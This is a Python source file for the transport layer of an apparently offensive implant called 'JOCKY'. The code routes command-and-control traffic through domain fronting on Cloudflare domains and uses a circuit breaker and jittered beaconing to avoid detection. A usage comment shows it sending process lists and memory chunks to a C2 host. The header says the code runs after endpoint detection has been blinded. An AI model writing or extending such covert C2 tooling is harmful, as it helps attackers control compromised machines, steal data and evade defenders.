# transport/cdn_router.py
# [JOCKY phase 14 -- CDN-aware transport router]
#
# PURPOSE
# -------
# Top-level transport entry point for the JOCKY agent.
# Selects between domain fronting and direct TLS based on availability.
# Implements exponential backoff, circuit breaker, and front rotation.
# Called by the agent execution engine post-EDR-blinding.
#
# USAGE (from agent)
# ------------------
#   from transport.cdn_router import JockyTransport
#   t = JockyTransport(agent_id="abc123", psk=b"...", c2="c2.example.com")
#   t.checkin()
#   t.send_result({"proc_list": [...], "memory_chunk": "..."})

import time
import logging
import threading
from typing import Optional, Dict, Any
from transport.cloud_api_wrapper import CloudAPIWrapper

logger = logging.getLogger("jocky.transport.router")

# ── CDN front domain pools (swap per campaign) ────────────────────────────────
CLOUDFLARE_FRONTS = [
    "cdnjs.cloudflare.com",
    "ajax.cloudflare.com",
    "www.cloudflare.com",
    "blog.cloudflare.com",
]

# ── retry + circuit breaker config ───────────────────────────────────────────
MAX_RETRIES       = 5
BASE_BACKOFF_SEC  = 2.0
MAX_BACKOFF_SEC   = 120.0
CB_THRESHOLD      = 10   # consecutive failures before circuit opens
CB_RESET_SEC      = 300  # seconds before circuit half-opens


class CircuitBreaker:
    """
    Three-state circuit breaker: CLOSED → OPEN → HALF-OPEN.
    Prevents hammering a dead C2 and creating detection-worthy retry storms.
    *when the circuit opens, the agent goes quiet. silence is not surrender.*
    """

    CLOSED    = "CLOSED"
    OPEN      = "OPEN"
    HALF_OPEN = "HALF_OPEN"

    def __init__(self, threshold: int = CB_THRESHOLD,
                 reset_sec: float = CB_RESET_SEC):
        self._threshold   = threshold
        self._reset_sec   = reset_sec
        self._failures    = 0
        self._state       = self.CLOSED
        self._opened_at   = 0.0
        self._lock        = threading.Lock()

    def record_success(self) -> None:
        with self._lock:
            self._failures = 0
            self._state    = self.CLOSED

    def record_failure(self) -> None:
        with self._lock:
            self._failures += 1
            if self._failures >= self._threshold:
                self._state     = self.OPEN
                self._opened_at = time.time()
                logger.warning(f"[circuit] OPEN after {self._failures} failures")

    def allow_request(self) -> bool:
        with self._lock:
            if self._state == self.CLOSED:
                return True
            if self._state == self.OPEN:
                if time.time() - self._opened_at >= self._reset_sec:
                    self._state = self.HALF_OPEN
                    logger.info("[circuit] HALF-OPEN -- testing")
                    return True
                return False
            # HALF_OPEN: allow one probe
            return True

    @property
    def state(self) -> str:
        return self._state


class JockyTransport:
    """
    JOCKY agent transport layer.
    Single entry point for all C2 communication.

    Encapsulates:
    - CloudAPIWrapper (Drive API camouflage)
    - FrontingPool (domain fronting)
    - CircuitBreaker (failure isolation)
    - Exponential backoff with jitter
    """

    def __init__(self,
                 agent_id:   str,
                 psk:        bytes,
                 c2_backend: str,
                 fronts:     list = None):
        self._api = CloudAPIWrapper(
            agent_id   = agent_id,
            psk        = psk,
            c2_backend = c2_backend,
            fronts     = fronts or CLOUDFLARE_FRONTS,
        )
        self._cb          = CircuitBreaker()
        self._retry_count = 0
        self._last_checkin = 0.0
        self._checkin_interval = 60.0  # seconds between check-ins

        logger.info(f"[router] transport init: agent={agent_id} c2={c2_backend}")

    def checkin(self) -> Optional[Dict[str, Any]]:
        """
        Check in with C2 — rate-limited and circuit-broken.
        Returns command dict on success, None on failure/silence.
        """
        if not self._cb.allow_request():
            logger.debug("[router] circuit OPEN -- skipping checkin")
            return None

        backoff = BASE_BACKOFF_SEC
        for attempt in range(MAX_RETRIES):
            try:
                result = self._api.checkin()
                if result is not None:
                    self._cb.record_success()
                    self._retry_count   = 0
                    self._last_checkin  = time.time()
                    logger.info("[router] checkin OK")
                    return result
            except Exception as e:
                logger.warning(f"[router] checkin attempt {attempt+1} failed: {e}")

            self._cb.record_failure()

            if attempt < MAX_RETRIES - 1:
                # exponential backoff with ±25% jitter
                import random
                sleep_time = min(backoff * (2 ** attempt), MAX_BACKOFF_SEC)
                sleep_time *= (1 + random.uniform(-0.25, 0.25))
                logger.debug(f"[router] backoff {sleep_time:.1f}s")
                time.sleep(sleep_time)

        return None

    def send_result(self, result: Dict[str, Any]) -> bool:
        """send forensic result to C2 with retry"""
        if not self._cb.allow_request():
            return False

        for attempt in range(MAX_RETRIES):
            try:
                ok = self._api.send_result(result)
                if ok:
                    self._cb.record_success()
                    logger.info(f"[router] result sent ({len(str(result))} chars)")
                    return True
            except Exception as e:
                logger.warning(f"[router] send_result attempt {attempt+1}: {e}")
                self._cb.record_failure()
                time.sleep(BASE_BACKOFF_SEC * (2 ** attempt))

        return False

    def heartbeat(self) -> bool:
        """periodic keep-alive"""
        if not self._cb.allow_request():
            return False
        ok = self._api.heartbeat()
        if ok:
            self._cb.record_success()
        else:
            self._cb.record_failure()
        return ok

    def run_checkin_loop(self, stop_event: threading.Event) -> None:
        """
        Background thread: periodic check-in loop.
        Call in a daemon thread from the agent's main loop.
        *the agent breathes at its own pace. steady. undetectable.*
        """
        logger.info("[router] checkin loop started")
        while not stop_event.is_set():
            elapsed = time.time() - self._last_checkin
            if elapsed >= self._checkin_interval:
                result = self.checkin()
                if result:
                    self._dispatch_command(result)
            else:
                time.sleep(1.0)

            # heartbeat every 5 minutes
            if int(time.time()) % 300 < 2:
                self.heartbeat()

        logger.info("[router] checkin loop stopped")

    def _dispatch_command(self, cmd: Dict[str, Any]) -> None:
        """
        Called when C2 delivers a command.
        Plugs into the JOCKY execution engine (phase 12 forensic primitives).
        """
        cmd_type = cmd.get("type")
        logger.info(f"[router] command received: type={cmd_type}")
        # hook point: execution_engine dispatch goes here
        # e.g.: from execution_engine.forensics import dispatch_cmd
        #        dispatch_cmd(cmd_type, cmd.get("args", {}), self)

    def close(self) -> None:
        self._api.close()
        logger.info("[router] transport closed")